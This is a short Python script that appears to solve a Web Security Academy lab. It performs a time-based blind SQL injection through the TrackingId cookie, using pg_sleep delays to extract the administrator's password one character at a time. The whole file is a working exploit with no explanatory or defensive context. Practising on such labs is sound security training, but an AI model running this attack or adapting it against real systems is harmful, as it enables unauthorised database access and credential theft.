import requests, sys, time

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
session = requests.Session()
url = 'https://0a0300cc0328e4528724c242006d000b.web-security-academy.net/'

response = session.get(url)
session_cookies = session.cookies

starting = 1

while True:
    for i in chars:
        tracking = session.cookies.get('TrackingId') + f"'%3b SELECT CASE WHEN (username = 'administrator' AND substr(password, {starting}, 1) = '{i}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- -" 
        cookies = {"session" : session.cookies.get('session'),
                   "TrackingId" : tracking }



        start_time = time.time()
        response = session.get(url, cookies=cookies)
        end_time = time.time()

        if end_time - start_time > 7:
            sys.stdout.write(i)
            sys.stdout.flush()
            starting += 1

